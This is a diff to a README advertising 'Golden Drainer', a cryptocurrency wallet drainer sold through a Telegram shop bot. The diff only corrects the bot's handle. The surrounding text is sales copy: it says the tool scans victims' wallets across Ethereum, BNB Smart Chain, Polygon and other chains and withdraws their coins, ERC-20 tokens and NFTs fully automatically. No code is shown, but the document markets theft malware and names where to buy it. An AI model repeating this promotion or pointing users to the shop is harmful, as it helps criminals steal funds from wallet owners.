@@ -3,7 +3,7 @@
 ### 🚀STABLE OPERATION IS GUARANTEED
 
 
-#### Our shop in Telegram: [@drainer_store_bot](https://t.me/drainers_shop_bot)
+#### Our shop in Telegram: [@drainers_shop_bot](https://t.me/drainers_shop_bot)
 #### You can buy automatically this script in our [Telegram Shop](https://t.me/drainers_shop_bot)
 
 Golden Drainer is the most advanced drainer on the market. It supports most popular networks: Ethereum, BNB Smart Chain, Polygon, Avalanche, Arbitrum, Fantom, Optimism, zkSync, Base, Era, Pulse. The search for assets on users' wallets is carried out using a reliable DeBank provider, and if desired, it can be replaced with Ankr, Zapper or OpenSea using the settings. Drainer successfully copes with finding the main coin of the wallet, ERC-20 tokens and NFTs, which it also withdraws in a fully automatic mode.
